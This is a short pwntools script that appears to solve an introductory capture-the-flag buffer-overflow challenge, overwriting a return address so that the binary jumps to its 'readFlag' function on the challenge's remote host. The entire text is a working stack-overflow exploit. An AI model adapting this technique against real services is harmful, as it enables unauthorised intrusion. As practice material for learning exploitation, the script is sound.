from pwn import *
e = ELF('./introbof')
#r = process('./introbof')
r = remote('introbufferoverflow.fly.dev', 5000)
r.sendline(b'a' * (0x20 + 8) + p64(e.symbols['readFlag']))
r.interactive()

